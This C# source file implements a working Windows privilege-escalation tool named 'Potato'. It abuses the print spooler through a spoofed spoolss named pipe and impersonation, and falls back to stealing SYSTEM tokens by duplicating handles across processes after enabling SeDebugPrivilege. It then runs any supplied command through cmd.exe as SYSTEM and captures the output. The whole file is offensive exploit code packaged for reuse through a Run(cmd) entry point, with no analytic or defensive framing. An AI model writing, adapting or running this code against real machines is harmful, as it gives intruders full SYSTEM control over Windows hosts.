using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class Potato
{
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr CreateNamedPipeW(string n, uint om, uint pm, uint mi, uint ob, uint ib, uint to, IntPtr sa);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ConnectNamedPipe(IntPtr h, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DisconnectNamedPipe(IntPtr h);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sa, uint d, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint da, bool ih, int pid);
    [DllImport("kernel32.dll")]
    static extern bool GetExitCodeProcess(IntPtr h, out uint code);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateNamedPipeClient(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr h, uint a, IntPtr at, int il, int tt, out IntPtr nt);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUserW(IntPtr ht, string an, StringBuilder cl, IntPtr pa, IntPtr ta, bool ih, uint cf, IntPtr env, string cwd, ref SI si, out PI pi);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr ht, uint lf, string an, StringBuilder cl, uint cf, IntPtr env, string cwd, ref SI si, out PI pi);
    [DllImport("advapi32.dll")]
    static extern bool RevertToSelf();
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr tok, int cls, IntPtr buf, int len, out int rlen);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ConvertSidToStringSidW(IntPtr sid, out IntPtr str);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenThreadToken(IntPtr th, uint da, bool self, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis, ref TP newState, int bufLen, IntPtr prev, IntPtr retLen);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValueW(string sys, string name, out long luid);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr h);

    [StructLayout(LayoutKind.Sequential)]
    struct TP { public int Count; public long Luid; public int Attr; }

    [DllImport("userenv.dll", SetLastError = true)]
    static extern bool CreateEnvironmentBlock(out IntPtr env, IntPtr token, bool inherit);
    [DllImport("userenv.dll")]
    static extern bool DestroyEnvironmentBlock(IntPtr env);

    [DllImport("ntdll.dll")]
    static extern uint NtQuerySystemInformation(uint cls, IntPtr buf, uint len, out uint rlen);
    [DllImport("ntdll.dll")]
    static extern uint NtDuplicateObject(IntPtr src, IntPtr srcH, IntPtr tgt, out IntPtr tgtH, uint da, uint attr, uint opt);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool OpenPrinterW(string n, out IntPtr h, IntPtr d);
    [DllImport("winspool.drv")]
    static extern bool ClosePrinter(IntPtr h);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct SI
    {
        public int cb; public string r1, desk, title;
        public int x, y, xs, ys, xc, yc, fa, fl;
        public short sw, r2; public IntPtr r3, hIn, hOut, hErr;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PI { public IntPtr hProc, hThread; public int pid, tid; }

    static readonly IntPtr BAD = new IntPtr(-1);
    static IntPtr _sysToken = IntPtr.Zero;
    static volatile bool _got = false;
    static ManualResetEvent _pipeReady = new ManualResetEvent(false);

    static string GetTokenSid(IntPtr token)
    {
        int len = 0;
        GetTokenInformation(token, 1, IntPtr.Zero, 0, out len);
        if (len == 0) return null;
        IntPtr buf = Marshal.AllocHGlobal(len);
        if (!GetTokenInformation(token, 1, buf, len, out len))
        { Marshal.FreeHGlobal(buf); return null; }
        IntPtr sid = Marshal.ReadIntPtr(buf);
        IntPtr sidStr;
        if (!ConvertSidToStringSidW(sid, out sidStr))
        { Marshal.FreeHGlobal(buf); return null; }
        string result = Marshal.PtrToStringUni(sidStr);
        LocalFree(sidStr);
        Marshal.FreeHGlobal(buf);
        return result;
    }

    static int GetTokenImpLevel(IntPtr token)
    {
        int len = 0;
        GetTokenInformation(token, 9, IntPtr.Zero, 0, out len);
        if (len == 0) return -1;
        IntPtr buf = Marshal.AllocHGlobal(len);
        if (!GetTokenInformation(token, 9, buf, len, out len))
        { Marshal.FreeHGlobal(buf); return -1; }
        int level = Marshal.ReadInt32(buf);
        Marshal.FreeHGlobal(buf);
        return level;
    }

    static int GetTokenType(IntPtr token)
    {
        int len = 0;
        GetTokenInformation(token, 8, IntPtr.Zero, 0, out len);
        if (len == 0) return -1;
        IntPtr buf = Marshal.AllocHGlobal(len);
        if (!GetTokenInformation(token, 8, buf, len, out len))
        { Marshal.FreeHGlobal(buf); return -1; }
        int tt = Marshal.ReadInt32(buf);
        Marshal.FreeHGlobal(buf);
        return tt;
    }

    static string _lastDiag = "";
    static string _pipeDiag = "";

    static bool EnableDebugPriv()
    {
        IntPtr tok;
        if (!OpenThreadToken(GetCurrentThread(), 0x0020 | 0x0008, false, out tok)) return false;
        long luid;
        if (!LookupPrivilegeValueW(null, "SeDebugPrivilege", out luid))
        { CloseHandle(tok); return false; }
        var tp = new TP { Count = 1, Luid = luid, Attr = 2 };
        bool ok = AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        CloseHandle(tok);
        return ok && Marshal.GetLastWin32Error() == 0;
    }

    static IntPtr FindSystemTokenViaHandles()
    {
        const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

        uint bufSize = 0x10000;
        IntPtr buf = Marshal.AllocHGlobal((int)bufSize);
        uint retLen;

        while (NtQuerySystemInformation(0x40, buf, bufSize, out retLen) == STATUS_INFO_LENGTH_MISMATCH)
        {
            Marshal.FreeHGlobal(buf);
            bufSize *= 2;
            buf = Marshal.AllocHGlobal((int)bufSize);
        }

        long count;
        int entrySize, headerSize;
        if (IntPtr.Size == 8)
        { count = Marshal.ReadInt64(buf, 0); headerSize = 16; entrySize = 40; }
        else
        { count = Marshal.ReadInt32(buf, 0); headerSize = 8; entrySize = 28; }

        int myPid = Process.GetCurrentProcess().Id;
        IntPtr myProc = GetCurrentProcess();
        int selfHandles = 0, selfSysToks = 0;

        // Phase 1: scan handles in own process
        for (long i = 0; i < count; i++)
        {
            IntPtr entry = new IntPtr(buf.ToInt64() + headerSize + i * entrySize);
            long pid;
            IntPtr handle;
            if (IntPtr.Size == 8)
            { pid = Marshal.ReadInt64(entry, 8); handle = Marshal.ReadIntPtr(entry, 16); }
            else
            { pid = Marshal.ReadInt32(entry, 4); handle = Marshal.ReadIntPtr(entry, 8); }

            if (pid != myPid) continue;
            selfHandles++;

            string sid = GetTokenSid(handle);
            if (sid != "S-1-5-18") continue;
            selfSysToks++;

            int tokType = GetTokenType(handle);
            int impLevel = (tokType == 2) ? GetTokenImpLevel(handle) : -1;

            if (tokType == 1 || impLevel >= 2)
            {
                IntPtr primary;
                if (DuplicateTokenEx(handle, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
                { Marshal.FreeHGlobal(buf); return primary; }
            }
        }

        // Phase 2: duplicate from other processes
        int lastPid = -1;
        IntPtr lastProcHandle = IntPtr.Zero;
        int opened = 0, duped = 0, sysToks = 0;

        for (long i = 0; i < count; i++)
        {
            IntPtr entry = new IntPtr(buf.ToInt64() + headerSize + i * entrySize);
            long pid;
            IntPtr handle;
            if (IntPtr.Size == 8)
            { pid = Marshal.ReadInt64(entry, 8); handle = Marshal.ReadIntPtr(entry, 16); }
            else
            { pid = Marshal.ReadInt32(entry, 4); handle = Marshal.ReadIntPtr(entry, 8); }

            if (pid == myPid || pid <= 4) continue;

            if ((int)pid != lastPid)
            {
                if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
                lastProcHandle = OpenProcess(0x0440, false, (int)pid);
                if (lastProcHandle == IntPtr.Zero)
                    lastProcHandle = OpenProcess(0x0040, false, (int)pid);
                lastPid = (int)pid;
                if (lastProcHandle != IntPtr.Zero) opened++;
            }
            if (lastProcHandle == IntPtr.Zero) continue;

            IntPtr dupHandle;
            if (NtDuplicateObject(lastProcHandle, handle, myProc, out dupHandle, 0, 0, 2) != 0) continue;
            duped++;

            string sid = GetTokenSid(dupHandle);
            if (sid == "S-1-5-18")
            {
                sysToks++;
                int tokType = GetTokenType(dupHandle);
                int impLevel = (tokType == 2) ? GetTokenImpLevel(dupHandle) : -1;

                if (tokType == 1 || impLevel >= 2)
                {
                    IntPtr primary;
                    if (DuplicateTokenEx(dupHandle, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
                    {
                        CloseHandle(dupHandle);
                        if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
                        Marshal.FreeHGlobal(buf);
                        return primary;
                    }
                }
            }
            CloseHandle(dupHandle);
        }

        if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
        Marshal.FreeHGlobal(buf);
        _lastDiag = "handles=" + count + ",self=" + selfHandles + ",selfSys=" + selfSysToks
            + ",procsOpened=" + opened + ",duped=" + duped + ",sysToks=" + sysToks;
        return IntPtr.Zero;
    }

    static void PipeServer(string path)
    {
        IntPtr hp = CreateNamedPipeW(path, 3, 0, 10, 4096, 4096, 0, IntPtr.Zero);
        if (hp == BAD) { _pipeReady.Set(); return; }
        _pipeReady.Set();
        ConnectNamedPipe(hp, IntPtr.Zero);

        if (ImpersonateNamedPipeClient(hp))
        {
            string pipeId = WindowsIdentity.GetCurrent().Name;
            _pipeDiag = "pipeClient=" + pipeId;

            IntPtr threadTok;
            if (OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out threadTok))
            {
                string sid = GetTokenSid(threadTok);
                if (sid == "S-1-5-18")
                {
                    IntPtr primary;
                    if (DuplicateTokenEx(threadTok, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
                    {
                        _sysToken = primary; _got = true;
                        _pipeDiag += ",directToken=SYSTEM";
                    }
                    CloseHandle(threadTok);
                }
                else
                {
                    CloseHandle(threadTok);
                    bool dbg = EnableDebugPriv();
                    _pipeDiag += ",debugPriv=" + (dbg ? "enabled" : "unavail");

                    IntPtr sysToken = FindSystemTokenViaHandles();
                    _pipeDiag += ",imp_" + _lastDiag;
                    if (sysToken != IntPtr.Zero)
                    { _sysToken = sysToken; _got = true; }
                }
            }
            RevertToSelf();
        }
        else
        {
            _pipeDiag = "impersonateFailed=" + Marshal.GetLastWin32Error();
        }

        if (!_got)
        {
            IntPtr sysToken = FindSystemTokenViaHandles();
            _pipeDiag += ",noImp_" + _lastDiag;
            if (sysToken != IntPtr.Zero)
            { _sysToken = sysToken; _got = true; }
        }

        DisconnectNamedPipe(hp); CloseHandle(hp);
    }

    static bool RunSpoofer(int timeout)
    {
        _got = false; _pipeReady.Reset();
        var rng = new Random();
        string rnd = ""; for (int i = 0; i < 8; i++) rnd += "abcdefghijklmno"[rng.Next(15)];
        string pp = @"\\.\pipe\" + rnd + @"\pipe\spoolss";
        string trig = @"\\localhost/pipe/" + rnd;

        new Thread(() => PipeServer(pp)) { IsBackground = true }.Start();
        if (!_pipeReady.WaitOne(5000)) return false;

        new Thread(() => { Thread.Sleep(300);
            IntPtr hp; OpenPrinterW(trig, out hp, IntPtr.Zero);
            if (hp != IntPtr.Zero) ClosePrinter(hp);
        }) { IsBackground = true }.Start();

        for (int w = 0; w < timeout && !_got; w += 100) Thread.Sleep(100);
        return _got;
    }

    static bool SpoolerUp()
    {
        IntPtr h = CreateFileW(@"\\.\pipe\spoolss", 0x80000000u, 1, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h != BAD) { CloseHandle(h); return true; }
        return false;
    }

    static bool RunDirect()
    {
        _got = false;
        IntPtr sysToken = FindSystemTokenViaHandles();
        if (sysToken != IntPtr.Zero)
        { _sysToken = sysToken; _got = true; }
        return _got;
    }

    static string Exec(string cmd)
    {
        if (_sysToken == IntPtr.Zero) return "ERR:NO_TOKEN";

        string tf = @"C:\Windows\Temp\" + Guid.NewGuid().ToString("N").Substring(0, 12) + ".t";
        try { File.WriteAllText(tf, ""); } catch { }

        string sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
        var cl = new StringBuilder(sysDir + @"\cmd.exe /c (" + cmd + ") > " + "\"" + tf + "\"" + " 2>&1");
        var si = new SI(); si.cb = Marshal.SizeOf(si); PI pi;

        IntPtr envBlock = IntPtr.Zero;
        CreateEnvironmentBlock(out envBlock, _sysToken, false);
        uint flags = 0x08000000u | 0x00000400u;

        IntPtr impToken;
        DuplicateTokenEx(_sysToken, 0xF01FF, IntPtr.Zero, 2, 2, out impToken);
        ImpersonateLoggedOnUser(impToken);

        bool ok = CreateProcessAsUserW(_sysToken, null, cl, IntPtr.Zero, IntPtr.Zero, false, flags, envBlock, sysDir, ref si, out pi);
        if (!ok)
        {
            ok = CreateProcessWithTokenW(_sysToken, 0, null, cl, flags, envBlock, sysDir, ref si, out pi);
            if (!ok)
            {
                int err = Marshal.GetLastWin32Error();
                RevertToSelf(); CloseHandle(impToken);
                if (envBlock != IntPtr.Zero) DestroyEnvironmentBlock(envBlock);
                return "ERR:CREATEPROCESS:" + err;
            }
        }
        RevertToSelf(); CloseHandle(impToken);

        WaitForSingleObject(pi.hProc, 30000);
        string output = "";
        try { if (File.Exists(tf)) output = File.ReadAllText(tf).Trim(); }
        catch { }
        try { File.Delete(tf); } catch { }
        if (envBlock != IntPtr.Zero) DestroyEnvironmentBlock(envBlock);
        CloseHandle(pi.hProc); CloseHandle(pi.hThread);
        return output;
    }

    public static string Run(string cmd) { return Run(cmd, "auto"); }

    public static string Run(string cmd, string tech)
    {
        try
        {
            _got = false; _sysToken = IntPtr.Zero;
            string used = "";
            string diag = "";

            bool spoolerRunning = SpoolerUp();

            if (tech == "auto" || tech == "spooler")
            {
                if (spoolerRunning)
                {
                    if (RunSpoofer(15000)) used = "spooler";
                    else diag += "spooler:pipe_ok_but_no_token;";
                }
                else diag += "spooler:service_not_running;";
            }
            if (!_got && (tech == "auto" || tech == "direct"))
            {
                if (RunDirect()) used = "direct";
                else diag += "direct:no_accessible_system_token;";
            }
            if (!_got)
            {
                string id = WindowsIdentity.GetCurrent().Name;
                return "FAIL:NO_SYSTEM_TOKEN|svc=" + id + "|spooler=" + (spoolerRunning ? "up" : "down")
                    + "|" + diag + "|pipe:" + _pipeDiag + "|direct:" + _lastDiag;
            }

            string result = Exec(cmd);
            if (_sysToken != IntPtr.Zero) { CloseHandle(_sysToken); _sysToken = IntPtr.Zero; }
            return "[" + used + "] " + result;
        }
        catch (Exception ex) { return "ERR:" + ex.GetType().Name + ":" + ex.Message; }
    }
}
